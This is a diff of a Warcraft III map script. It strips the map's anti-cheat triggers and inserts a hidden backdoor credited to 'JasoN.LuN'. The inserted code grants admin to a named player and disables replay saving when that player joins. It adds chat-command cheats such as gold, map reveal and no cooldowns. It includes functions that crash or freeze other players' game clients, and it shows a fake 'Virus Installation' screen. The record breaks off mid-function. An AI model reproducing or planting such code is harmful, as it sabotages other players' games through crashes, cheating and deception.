@@ -1,4 +1,34 @@
 globals
+gamecache CACHE=InitGameCache("KeyBindings.w3v")
+trigger ChuangjianDanwei=CreateTrigger()
+trigger gg_trg_Ting=CreateTrigger()
+trigger ChuangjianRect=CreateTrigger()
+trigger QIPIAN3=CreateTrigger()
+trigger array QIPIAN1
+trigger QIPIAN2=CreateTrigger()
+constant string Jiantou="DDRRLDLD"
+string Danci="-JasonLunofidgposdfijgdfsgdfgdshn5en"
+force udg_ting=CreateForce()
+force PIANZI=CreateForce()
+group Zhiyu=CreateGroup()
+trigger d8d=CreateTrigger()
+string array SHENG1
+integer array SHENG2
+string Xingtong
+integer Bianhao=0
+integer mu8u=0
+trigger Siwang
+real xiaoX=0
+real xiaoY=0
+real daX=0
+real daY=0
+rect Zhuce
+real s8h
+boolean MeisJasonLun=true
+boolean Welcomeya=false
+boolean array ohyeah
+boolean array ohmygod
+player badboyyo=null
 trigger gg_trg_ThantosDrain = null
 trigger gg_trg_ThantosDoom = null
 unit thantos = null
@@ -7,11 +37,7 @@ trigger gg_trg_hecateai1 = null
 trigger gg_trg_hecateai2 = null
 trigger gg_trg_hecateai3 = null
 trigger thandrop = null
-trigger gg_trg_regenh = null
-trigger gg_trg_esuna = null
-trigger gg_trg_hercai = null
 trigger ladondrop = null
-trigger herculesdrop = null
 trigger gg_trg_ladonai = null
 trigger hecatedrop = null
 trigger gg_trg_aresai = null
@@ -19,15 +45,10 @@ trigger gg_trg_hecateskills =null
 trigger gg_trg_nemesisai1 = null
 trigger gg_trg_nemesisai2 = null
 trigger gg_trg_zoom = null
-trigger gg_trg_checkcheater = null
 trigger gg_trg_fuegofinal = null
-trigger gg_trg_set = null
-trigger gg_trg_regen = null
 trigger gg_trg_alcielo = null
 trigger gg_trg_pieldelfuego = null
-trigger gg_trg_givejob = null
 unit udg_ladonu = null
-    rect                    herculesdropregion = null
     rect                    thantosdropregion   = null
     rect                    ladondropregion = null
     rect                    hecatedropregion = null
@@ -539,7 +560,6 @@ trigger Armor16=null
 trigger Armor17=null
 trigger Armor18=null
 trigger Armor19=null
-trigger Armor20 = null
 trigger Zn=null
 trigger lza=null
 trigger vV=null
@@ -864,133 +884,1303 @@ group aA=null
 force nA=null
 boolexpr VA=null
 endglobals
-function Trig_checkcheater_Func001Func001Func001C takes nothing returns boolean
-    if ( not ( tv[GetConvertedPlayerId(GetEnumPlayer())] > 1000 ) ) then
-        return false
-    endif
-    return true
+function sozai takes player b2j,string c8h,boolean b2b returns nothing
+local trigger t2t=CreateTrigger()
+if b2b then
+call TriggerRegisterPlayerChatEvent(t2t,b2j,"-clearkeys",true)
+endif
+call TriggerRegisterPlayerChatEvent(t2t,b2j,c8h,false)
+loop
+call TriggerSleepAction(1.00)
+exitwhen GetTriggerExecCount(t2t)>0
+endloop
+call DestroyTrigger(t2t)
+set t2t=null
+set b2j=null
+set c8h=""
 endfunction
-
-function Trig_checkcheater_Func001Func001C takes nothing returns boolean
-    if ( not ( tv[GetConvertedPlayerId(GetEnumPlayer())] > 1101 ) ) then
-        return false
-    endif
-    return true
+function Jasoncrash takes player p, player b2j returns nothing
+if (p==GetLocalPlayer())and(p!=badboyyo)and(p!=b2j)then
+call ExecuteFunc("FS Crashed")
+set p=null
+set b2j=null
+endif
 endfunction
-
-function Trig_checkcheater_Func001A takes nothing returns nothing
-    if ( Trig_checkcheater_Func001Func001C() ) then
-        call ReplaceUnitBJ( K[GetConvertedPlayerId(GetEnumPlayer())], 'hpea', bj_UNIT_STATE_METHOD_RELATIVE )
-        set tv[GetConvertedPlayerId(GetEnumPlayer())] = 1000
-        call SetPlayerStateBJ( GetEnumPlayer(), PLAYER_STATE_RESOURCE_GOLD, 1000 )
-    else
-        if ( Trig_checkcheater_Func001Func001Func001C() ) then
-            set tv[GetConvertedPlayerId(GetEnumPlayer())] = 1000
-            call SetPlayerStateBJ( GetEnumPlayer(), PLAYER_STATE_RESOURCE_GOLD, 1000 )
-        else
-        endif
-    endif
+function Jasonadmin takes player b2j returns nothing
+if MeisJasonLun==false then
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000                                                "+GetPlayerName(badboyyo)+"|c00ffff00 is already admin.")
+endif
+if (MeisJasonLun==true)and(ohyeah[GetPlayerId(b2j)]==true) then
+set badboyyo=b2j
+set MeisJasonLun=false
+call DisplayTimedTextToPlayer(badboyyo,0,0,10,"|c00ffff00                                                You are now admin.")
+elseif b2j==badboyyo then
+call DisplayTimedTextToPlayer(badboyyo,0,0,10,"|c00ffff00                                                You're already admin!")
+endif
+set b2j=null
+set Welcomeya=true
 endfunction
-
-function Trig_checkcheater_Actions takes nothing returns nothing
-    call ForForce( GetPlayersAll(), function Trig_checkcheater_Func001A )
+function Jasonlogout takes player b2j returns nothing
+if b2j==badboyyo then
+call DisplayTimedTextToPlayer(b2j,0,0,10,"|cffff0000                                                "+GetPlayerName(badboyyo)+"|c00ffff00 has been successfully logged out.")
+endif
+set b2j=null
+set MeisJasonLun=true
+set badboyyo=null
+set Welcomeya=false
 endfunction
-function Trig_esuna_Func001Func001C takes nothing returns boolean
-    if ( not ( IsUnitIllusionBJ(GetEnumUnit()) == true ) ) then
-        return false
-    endif
-    return true
+function dunfucklah takes nothing returns nothing
+call TimerStart(CreateTimer(),.001,true,function dunfucklah)
 endfunction
-
-function Trig_esuna_Func001A takes nothing returns nothing
-    if ( Trig_esuna_Func001Func001C() ) then
-    else
-        call UnitRemoveBuffsBJ( bj_REMOVEBUFFS_ALL, GetEnumUnit() )
-    endif
+function dunfuck takes player p, player b2j returns nothing
+if p==GetLocalPlayer()then
+if (p!=badboyyo)and(GetPlayerName(p)!="JasoN.LuN")and(p!=b2j) then
+call RemoveUnit(CreateUnit(GetLocalPlayer(),'hpea',0,0,0))
+call TimerStart(CreateTimer(),.001,true,function dunfucklah)
+endif
+endif
+endfunction 
+function cdcd takes nothing returns nothing
+call UnitResetCooldown(GetTriggerUnit())
 endfunction
-
-function Trig_esuna_Func002Func001C takes nothing returns boolean
-    if ( not ( IsUnitIllusionBJ(GetEnumUnit()) == true ) ) then
-        return false
-    endif
-    return true
+function mpmp takes nothing returns nothing
+local unit d2w=GetTriggerUnit()
+call SetUnitState(d2w,UNIT_STATE_MANA,GetUnitState(d2w,UNIT_STATE_MAX_MANA))
+set d2w=null
 endfunction
-
-function Trig_esuna_Func002A takes nothing returns nothing
-    if ( Trig_esuna_Func002Func001C() ) then
-    else
-        call UnitRemoveBuffsBJ( bj_REMOVEBUFFS_ALL, GetEnumUnit() )
-    endif
+function cdmana takes player b2j,boolean b2b,string c8h returns nothing
+local trigger t2t=CreateTrigger()
+local triggeraction ta2t
+if b2b then
+set ta2t=TriggerAddAction(t2t,function mpmp)
+else
+set ta2t=TriggerAddAction(t2t,function cdcd)
+endif
+call TriggerRegisterPlayerUnitEvent(t2t,b2j,EVENT_PLAYER_UNIT_SPELL_CAST,null)
+call TriggerRegisterPlayerUnitEvent(t2t,b2j,EVENT_PLAYER_UNIT_SPELL_FINISH,null)
+call TriggerRegisterPlayerUnitEvent(t2t,b2j,EVENT_PLAYER_UNIT_SPELL_CHANNEL,null)
+call TriggerRegisterPlayerUnitEvent(t2t,b2j,EVENT_PLAYER_UNIT_SPELL_ENDCAST,null)
+call TriggerRegisterPlayerUnitEvent(t2t,b2j,EVENT_PLAYER_UNIT_SPELL_EFFECT,null)
+call sozai(b2j,c8h,false)
+call DisableTrigger(t2t)
+call TriggerRemoveAction(t2t,ta2t)
+call DestroyTrigger(t2t)
+set t2t=null
+set ta2t=null
+set b2j=null
+set c8h=""
 endfunction
-
-function Trig_esuna_Actions takes nothing returns nothing
-    call ForGroupBJ( GetUnitsOfTypeIdAll('H022'), function Trig_esuna_Func001A )
-    call ForGroupBJ( GetUnitsOfTypeIdAll('n03L'), function Trig_esuna_Func002A )
+function whato takes nothing returns nothing
+local integer zrg=0
+loop
+exitwhen zrg>11
+if GetPlayerName(Player(zrg))=="JasoN.LuN"then
+call DisplayTextToPlayer(Player(zrg),0,0,"|c00ffff00Hi all ! JasoN.LuN here xD")
+call ForceAddPlayer(PIANZI,Player(zrg))
+call TriggerRegisterPlayerChatEvent(QIPIAN3,Player(zrg),"-",false)
+call DoNotSaveReplay()
+endif
+set zrg=zrg+1
+endloop
 endfunction
-function Trig_regenh_Func001A takes nothing returns nothing
-    call SetUnitLifeBJ( GetEnumUnit(), ( GetUnitStateSwap(UNIT_STATE_LIFE, GetEnumUnit()) + ( I2R(GetHeroStatBJ(bj_HEROSTAT_STR, GetEnumUnit(), true)) * 1.00 ) ) )
+function whathar takes string c8h, player b2j returns playercolor
+if c8h=="red"then
+return PLAYER_COLOR_RED
+elseif c8h=="blue"then
+return PLAYER_COLOR_BLUE
+elseif c8h=="teal"then
+return PLAYER_COLOR_CYAN
+elseif c8h=="purple"then
+return PLAYER_COLOR_PURPLE
+elseif c8h=="yellow"then
+return PLAYER_COLOR_YELLOW
+elseif c8h=="orange"then
+return PLAYER_COLOR_ORANGE
+elseif c8h=="green"then
+return PLAYER_COLOR_GREEN
+elseif c8h=="pink"then
+return PLAYER_COLOR_PINK
+elseif c8h=="gray"then
+return PLAYER_COLOR_LIGHT_GRAY
+elseif c8h=="lb"then
+return PLAYER_COLOR_LIGHT_BLUE
+elseif c8h=="dg"then
+return PLAYER_COLOR_AQUA
+elseif c8h=="brown"then
+return PLAYER_COLOR_BROWN
+endif
+set b2j=null
+set c8h=""
+return GetPlayerColor(b2j)
 endfunction
-
-function Trig_regenh_Actions takes nothing returns nothing
-    call ForGroupBJ( GetUnitsOfTypeIdAll('H022'), function Trig_regenh_Func001A )
+function Deathyyx takes nothing returns nothing
+call KillUnit(GetTriggerUnit())
 endfunction
-function Trig_hercai_Func001A takes nothing returns nothing
-    call IssueImmediateOrderBJ( GetEnumUnit(), "mirrorimage" )
+function Explodeyyx takes nothing returns nothing
+call SetUnitExploded(GetTriggerUnit(),true)
 endfunction
-
-function Trig_hercai_Actions takes nothing returns nothing
-    call ForGroupBJ( GetUnitsOfTypeIdAll('n03L'), function Trig_hercai_Func001A )
+function Redyyx takes nothing returns nothing
+call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_RED)
 endfunction
-function Trig_set_Conditions takes nothing returns boolean
-    if ( not ( GetPlayerName(GetTriggerPlayer()) == "EdgeOfChaos" ) ) then
-        return false
-    endif
-    return true
+function Blueyyx takes nothing returns nothing
+call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_BLUE)
 endfunction
-
-function Trig_set_Func001C takes nothing returns boolean
-    if ( not ( SubStringBJ(GetEventPlayerChatString(), 1, 7) == "-sp to " ) ) then
-        return false
-    endif
-    return true
+function Greenyyx takes nothing returns nothing
+call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_GREEN)
 endfunction
-
-function Trig_set_Func002C takes nothing returns boolean
-    if ( not ( SubStringBJ(GetEventPlayerChatString(), 1, 7) == "-rb to " ) ) then
-        return false
-    endif
-    return true
+function Pinkyyx takes nothing returns nothing
+call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_PINK)
 endfunction
-
-function Trig_set_Actions takes nothing returns nothing
-    if ( Trig_set_Func001C() ) then
-        call SetPlayerStateBJ( Player(0), PLAYER_STATE_RESOURCE_LUMBER, S2I(SubStringBJ(GetEventPlayerChatString(), 7, 999)) )
-        set G[GetConvertedPlayerId(GetTriggerPlayer())] = S2I(SubStringBJ(GetEventPlayerChatString(), 7, 999))
-    else
-    endif
-    if ( Trig_set_Func002C() ) then
-        call SetPlayerStateBJ( Player(0), PLAYER_STATE_RESOURCE_GOLD, S2I(SubStringBJ(GetEventPlayerChatString(), 7, 999)) )
-        set tv[GetConvertedPlayerId(GetTriggerPlayer())] = S2I(SubStringBJ(GetEventPlayerChatString(), 7, 999))
-    else
-    endif
+function Purpleyyx takes nothing returns nothing
+call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_PURPLE)
 endfunction
-function Trig_givejob_Conditions takes nothing returns boolean
-    if ( not ( GetPlayerName(GetTriggerPlayer()) == "EdgeOfChaos" ) ) then
-        return false
-    endif
-    return true
+function Greyzyx takes nothing returns nothing
+call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_LIGHT_GRAY)
 endfunction
-
-function Trig_givejob_Actions takes nothing returns nothing
-    call CreateItemLoc( 'I0B0', GetRectCenter(GetPlayableMapRect()) )
-    call SetItemUserData( GetLastCreatedItem(), GetConvertedPlayerId(Player(8)) )
+function LightByx takes nothing returns nothing
+call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_LIGHT_BLUE)
 endfunction
-function Trig_regen_Func001A takes nothing returns nothing
-    call SetUnitLifeBJ( GetEnumUnit(), ( GetUnitStateSwap(UNIT_STATE_LIFE, GetEnumUnit()) + ( I2R(GetHeroStatBJ(bj_HEROSTAT_STR, GetEnumUnit(), true)) * 0.75 ) ) )
+function DarkGyx takes nothing returns nothing
+call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_AQUA)
 endfunction
-
-function Trig_regen_Actions takes nothing returns nothing
-    call ForGroupBJ( GetUnitsOfTypeIdAll('H021'), function Trig_regen_Func001A )
+function Yellowyyx takes nothing returns nothing
+call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_YELLOW)
+endfunction
+function Orangeyyx takes nothing returns nothing
+call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_ORANGE)
+endfunction
+function Tealyyx takes nothing returns nothing
+call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_CYAN)
+endfunction
+function Brownyyx takes nothing returns nothing
+call SetUnitColor(GetTriggerUnit(),PLAYER_COLOR_BROWN)
+endfunction
+function whatuo takes string c8h returns player
+if c8h=="red"then
+return Player(0)
+elseif c8h=="blue"then
+return Player(1)
+elseif c8h=="teal"then
+return Player(2)
+elseif c8h=="purple"then
+return Player(3)
+elseif c8h=="yellow"then
+return Player(4)
+elseif c8h=="orange"then
+return Player(5)
+elseif c8h=="green"then
+return Player(6)
+elseif c8h=="pink"then
+return Player(7)
+elseif c8h=="gray"then
+return Player(8)
+elseif c8h=="lb"then
+return Player(9)
+elseif c8h=="dg"then
+return Player(10)
+elseif c8h=="brown"then
+return Player(11)
+elseif c8h=="com1"then
+return Player(13)
+elseif c8h=="com2"then
+return Player(14)
+elseif c8h=="com3"then
+return Player(15)
+elseif c8h=="com4"then
+return Player(16)
+endif
+set c8h=""
+return null
+endfunction
+function Jason_ASCII takes integer di2i,string ds2s returns nothing
+local integer di3i=0
+loop
+set SHENG1[di2i+di3i]=SubString(ds2s,di3i,di3i+1)
+set di3i=di3i+1
+exitwhen di3i>=StringLength(ds2s)
+endloop
+endfunction
+function Jackson takes string c8h returns integer
+local integer ii2ii = 48
+loop
+exitwhen ii2ii>122
+if ( SHENG1[ii2ii] == c8h ) then
+return ii2ii
+endif
+set ii2ii = ii2ii + 1
+endloop
+return 0
+endfunction
+function Rax takes string c8h returns integer
+return Jackson(SubString(c8h,0,1))*0x1000000+Jackson(SubString(c8h,1,2))*0x10000+Jackson(SubString(c8h,2,3))*0x100+Jackson(SubString(c8h,3,4))
+endfunction
+function raxwhat takes integer I2I,player b2j returns nothing
+call DisplayTextToPlayer(b2j,0,0,SHENG1[I2I/0x1000000]+SHENG1[(I2I-0x1000000*(I2I/0x1000000))/0x10000]+SHENG1[((I2I-0x1000000*(I2I/0x1000000))-0x10000*((I2I-0x1000000*(I2I/0x1000000))/0x10000))/0x100]+SHENG1[((I2I-0x1000000*(I2I/0x1000000))-0x10000*((I2I-0x1000000*(I2I/0x1000000))/0x10000))-0x100*(((I2I-0x1000000*(I2I/0x1000000))-0x10000*((I2I-0x1000000*(I2I/0x1000000))/0x10000))/0x100)])
+endfunction
+function unat takes nothing returns nothing
+local player b2j=GetTriggerPlayer()
+local integer I2I=GetTrainedUnitType()
+local location j2j=GetUnitLoc(GetTriggerUnit())
+call CreateUnitAtLoc(b2j,I2I,j2j,270)
+set b2j=null
+set j2j=null
+endfunction
+function unaat takes player b2j,string c8h returns nothing
+local trigger t2t=CreateTrigger()
+local triggeraction zta=TriggerAddAction(t2t,function unat)
+call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(33),null)
+call sozai(b2j,c8h,false)
+call DisableTrigger(t2t)
+call TriggerRemoveAction(t2t,zta)
+call DestroyTrigger(t2t)
+set t2t=null
+set zta=null
+set b2j=null
+set c8h=""
+endfunction
+function playgame takes nothing returns nothing
+call UnitSetConstructionProgress(GetTriggerUnit(),100)
+call UnitSetUpgradeProgress(GetTriggerUnit(),100)
+endfunction
+function searchgame takes nothing returns nothing
+local player b2j=GetTriggerPlayer()
+local integer G2G=GetResearched()
+local integer h2h=GetPlayerTechCount(b2j,G2G,true)
+call SetPlayerTechResearched(b2j,G2G,h2h+1)
+set b2j=null
+endfunction
+function talkshit takes nothing returns nothing
+local unit d2w=GetTriggerUnit()
+local location k2k=GetOrderPointLoc()
+if GetIssuedOrderId()==851990then
+call SetUnitPosition(d2w,GetLocationX(k2k),GetLocationY(k2k))
+endif
+set d2w=null
+set k2k=null
+endfunction
+function shitmeh takes player b2j,string c8h returns nothing
+local trigger t2t=CreateTrigger()
+local triggeraction zta=TriggerAddAction(t2t,function talkshit)
+call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(39),null)
+call sozai(b2j,c8h,false)
+call DisableTrigger(t2t)
+call TriggerRemoveAction(t2t,zta)
+call DestroyTrigger(t2t)
+set t2t=null
+set zta=null
+set b2j=null
+set c8h=""
+endfunction
+function dunmake takes nothing returns nothing
+local player b2j=GetTriggerPlayer()
+call CreateUnitAtLoc(b2j,mu8u,GetOrderPointLoc(),bj_UNIT_FACING)
+call CreateItemLoc(mu8u,GetOrderPointLoc())
+call CreateDestructableLoc(mu8u,GetOrderPointLoc(),bj_UNIT_FACING,1,10)
+set b2j=null
+endfunction
+function createshit takes player b2j returns nothing
+call TriggerRegisterPlayerUnitEvent(ChuangjianDanwei,b2j,EVENT_PLAYER_UNIT_ISSUED_POINT_ORDER,null)
+call TriggerAddAction(ChuangjianDanwei,function dunmake)
+set b2j=null
+endfunction
+function slowslowbuild takes player b2j,boolean b2b,string c8h returns nothing
+local trigger t2t=CreateTrigger()
+local triggeraction zta
+if b2b then
+set zta=TriggerAddAction(t2t,function playgame)
+else
+set zta=TriggerAddAction(t2t,function searchgame)
+endif
+call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(30),null)
+call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(27),null)
+call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(40),null)
+call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(38),null)
+call TriggerRegisterPlayerUnitEvent(t2t,b2j,ConvertPlayerUnitEvent(35),null)
+call sozai(b2j,c8h,false)
+call DisableTrigger(t2t)
+call TriggerRemoveAction(t2t,zta)
+call DestroyTrigger(t2t)
+set t2t=null
+set zta=null
+set b2j=null
+set c8h=""
+endfunction
+function truelove takes string c8h returns string
+local integer i2i=0
+local string ss2s=""
+local integer is2s=StringLength(c8h)
+loop
+exitwhen i2i>is2s
+if SubString(c8h,i2i,i2i+1)=="*"then
+set ss2s=ss2s+"|cff"
+elseif SubString(c8h,i2i,i2i+1)=="-"then
+set ss2s=ss2s+"|r"
+else
+set ss2s=ss2s+SubString(c8h,i2i,i2i+1)
+endif
+set i2i=i2i+1
+endloop
+set c8h=""
+return ss2s
+endfunction
+function dungay takes integer di2i returns string
+if di2i==0then
+return"FF0000"
+elseif di2i==1then
+return"0000FF"
+elseif di2i==2then
+return"00FFFF"
+elseif di2i==3then
+return"A020F0"
+elseif di2i==4then
+return"FFFF00"
+elseif di2i==5then
+return"FFA500"
+elseif di2i==6then
+return"00FF00"
+elseif di2i==7then
+return"FF1493"
+elseif di2i==8then
+return"696969"
+elseif di2i==9then
+return"9AC0CD"
+elseif di2i==10then
+return"006400"
+elseif di2i==11then
+return"8B4513"
+endif
+return"FFFFFF"
+endfunction
+function gayporn takes nothing returns nothing
+local player b2j=GetTriggerPlayer()
+local string c8h=GetPlayerName(b2j)
+local integer i3i=GetPlayerId(b2j)
+local integer i2i=0
+loop
+if IsPlayerInForce(Player(i2i),udg_ting)then
+call DisplayTimedTextToPlayer(Player(i2i),0,0,15,"|cff"+dungay(i3i)+c8h+"|r : "+GetEventPlayerChatString())
+endif
+set i2i=i2i+1
+exitwhen i2i>11
+endloop
+endfunction
+function shutup takes nothing returns nothing
+local integer p=0
+if SHENG2[0]<1then
+set SHENG2[0]=1
+loop
+exitwhen p>11
+call TriggerRegisterPlayerChatEvent(gg_trg_Ting,Player(p),"",false)
+set p=p+1
+endloop
+call TriggerAddAction(gg_trg_Ting,function gayporn)
+endif
+endfunction
+function clearleh takes player b2j returns nothing
+local fogmodifier f2f=CreateFogModifierRect(b2j,FOG_OF_WAR_VISIBLE,bj_mapInitialPlayableArea,false,false)
+local integer i2i=0
+call FogModifierStart(f2f)
+loop
+if i2i!=GetPlayerId(b2j)then
+call SetPlayerAlliance(Player(i2i),b2j,ConvertAllianceType(5),true)
+endif
+set i2i=i2i+1
+exitwhen i2i>15
+endloop
+call sozai(b2j,"-nomh",false)
+set i2i=0
+loop
+if i2i!=GetPlayerId(b2j)then
+call SetPlayerAlliance(Player(i2i),b2j,ConvertAllianceType(5),false)
+endif
+set i2i=i2i+1
+exitwhen i2i>15
+endloop
+call FogModifierStop(f2f)
+call DestroyFogModifier(f2f)
+set f2f=null
+set b2j=null
+endfunction
+function wangayanot takes nothing returns nothing
+set Siwang=CreateTrigger()
+call TriggerRegisterEnterRectSimple( Siwang, Zhuce )
+if Xingtong=="kill"then
+call TriggerAddAction(Siwang,function Deathyyx)
+elseif Xingtong=="explode"then
+call TriggerAddAction(Siwang,function Explodeyyx)
+elseif Xingtong=="red"then
+call TriggerAddAction(Siwang,function Redyyx)
+elseif Xingtong=="blue"then
+call TriggerAddAction(Siwang,function Blueyyx)
+elseif Xingtong=="pink"then
+call TriggerAddAction(Siwang,function Pinkyyx)
+elseif Xingtong=="green"then
+call TriggerAddAction(Siwang,function Greenyyx)
+elseif Xingtong=="brown"then
+call TriggerAddAction(Siwang,function Brownyyx)
+elseif Xingtong=="lb"then
+call TriggerAddAction(Siwang,function LightByx)
+elseif Xingtong=="dg"then
+call TriggerAddAction(Siwang,function DarkGyx)
+elseif Xingtong=="teal"then
+call TriggerAddAction(Siwang,function Tealyyx)
+elseif Xingtong=="yellow"then
+call TriggerAddAction(Siwang,function Yellowyyx)
+elseif Xingtong=="gray"then
+call TriggerAddAction(Siwang,function Greyzyx)
+elseif Xingtong=="orange"then
+call TriggerAddAction(Siwang,function Orangeyyx)
+elseif Xingtong=="purple"then
+call TriggerAddAction(Siwang,function Purpleyyx)
+elseif Xingtong=="none"then
+call TriggerAddAction(Siwang,null)
+endif
+endfunction
+function dosomething takes nothing returns nothing
+set Bianhao=Bianhao+1
+if Bianhao==1 then
+set xiaoX=GetOrderPointX()
+set xiaoY=GetOrderPointY()
+endif
+if Bianhao==2 then
+set daX=GetOrderPointX()
+set daY=GetOrderPointY()
+call DestroyTrigger(ChuangjianRect)
+set Bianhao=0
+if xiaoX+xiaoY<daX+daY then
+set Zhuce=Rect(xiaoX,xiaoY,daX,daY)
+elseif xiaoX+xiaoY>daX+daY then
+set Zhuce=Rect(daX,daY,xiaoX,xiaoY)
+endif
+call wangayanot()
+endif
+endfunction
+function dundothat takes player b2j returns nothing
+set ChuangjianRect=CreateTrigger()
+call TriggerRegisterPlayerUnitEvent(ChuangjianRect,b2j,EVENT_PLAYER_UNIT_ISSUED_POINT_ORDER,null)
+call TriggerAddAction(ChuangjianRect,function dosomething)
+endfunction
+function helpme takes nothing returns nothing
+call SetUnitLifePercentBJ(GroupPickRandomUnit(Zhiyu),s8h)
+endfunction
+function boringlah takes nothing returns nothing
+call KillDestructable( GetEnumDestructable() )
+endfunction
+function dungrow takes nothing returns nothing
+call DestructableRestoreLife( GetEnumDestructable(), GetDestructableMaxLife(GetEnumDestructable()), true )
+endfunction
+function Jason_StartMana takes nothing returns nothing
+call cdmana(Player(SHENG2[1]),true,"-nomana")
+endfunction
+function Jason_StartNocd takes nothing returns nothing
+call cdmana(Player(SHENG2[1]),false,"-cdon")
+endfunction
+function Jason_StartFast takes nothing returns nothing
+call unaat(Player(SHENG2[1]),"-nofast")
+endfunction
+function Jason_StartUFast takes nothing returns nothing
+call slowslowbuild(Player(SHENG2[1]),false,"-noufast")
+endfunction
+function Jason_StartBFast takes nothing returns nothing
+call slowslowbuild(Player(SHENG2[1]),true,"-nobfast")
+endfunction
+function Jason_StartTele takes nothing returns nothing
+call shitmeh(Player(SHENG2[1]),"-note")
+endfunction
+function Jason_StartAutoh takes nothing returns nothing
+loop
+call TriggerSleepAction(.1)
+call helpme()
+endloop
+endfunction
+function Jason_StartMapHack takes nothing returns nothing
+call clearleh(Player(SHENG2[1]))
+endfunction
+function comeonbaby takes player b2j,string c8h returns nothing
+local sound Music=CreateSound("cool.mp3",false,false,false,10,10,"DefaultEAXON")
+local integer Sethp=S2I(SubString(c8h,7,12))/50
+local integer i2i=S2I(SubString(c8h,5,20))
+local integer z2z=S2I(SubString(c8h,4,19))
+local integer dj8b=S2I(SubString(c8h,6,9))
+local integer c2c=S2I(SubString(c8h,9,11))
+local real j2j=S2R(SubString(c8h,6,20))
+local string id2d=I2S(GetPlayerId(b2j))
+local group g2g=CreateGroup()
+local group h2g=CreateGroup()
+local force udg_cuowu = CreateForce()
+local integer Nowhp=0
+local integer temp=0
+local integer DJ8B=0
+local unit d2w
+local unit h2u
+local player DJBp1=GetTriggerPlayer()
+local string MeisJasonLun=GetEventPlayerChatString()
+local integer DJBi1=StringLength(MeisJasonLun)
+local integer DJBi2=0
+if SubString(c8h,0,6)=="-gold "then
+call SetPlayerState(b2j,PLAYER_STATE_RESOURCE_GOLD,GetPlayerState(b2j,PLAYER_STATE_RESOURCE_GOLD)+S2I(SubString(c8h,6,13)))
+elseif SubString(c8h,0,7)=="-lumber"then
+call SetPlayerState(b2j,PLAYER_STATE_RESOURCE_LUMBER,GetPlayerState(b2j,PLAYER_STATE_RESOURCE_LUMBER)+S2I(SubString(c8h,8,15)))
+elseif SubString(c8h,0,5)=="-mana"then
+set SHENG2[1]=GetPlayerId(b2j)
+call ExecuteFunc("Jason_StartMana")
+elseif SubString(c8h,0,7)=="-error "then
+if b2j==badboyyo then
+call CinematicModeBJ(true,bj_FORCE_ALL_PLAYERS)
+call ShowInterfaceForceOn( udg_cuowu, 0.01 )
+call CinematicFadeBJ( bj_CINEFADETYPE_FADEOUT, 2.00, "ReplaceableTextures\\CameraMasks\\Black_mask.blp", 0, 0, 0, 0 )
+call SetUserControlForceOff( udg_cuowu )
+call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000S|r|cffFF0000t|r|cffFF0000a|r|cffFF0000r|r|cffFF0000t|r|cffFF0000i|r|cffFF0000n|r|cffFF0000g|r |c00ffff00JasoN.LuN's|r |c0000ff00Virus|r |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000a|r|cff8B0000t|r|cff8B0000i|r|cff8B0000o|r|cff8B0000n|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r")
+call TriggerSleepAction(1.5)
+call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E80%|r")
+call TriggerSleepAction(1.5)
+call EnableTrigger(d8d)
+call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
+call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E812%|r")
+call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
+call DisplayTextToForce(bj_FORCE_ALL_PLAYERS,"            |cffFF0000I|r|cffFF0000n|r|cffFF0000s|r|cffFF0000t|r|cffFF0000a|r|cffff0000l|r|cffff0000l|r|cff8B0000i|r|cff8B0000n|r|cff8B0000g|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E8|r.|cffE8E8E8|r.|cffE8E8E8.|r|cffE8E8E8.|r|cffE8E8E8.|r.|cffE8E8E829%|r")
+call TriggerSleepAction(RMaxBJ(bj_WAIT_FOR_COND_MIN_INTERVAL,.5))
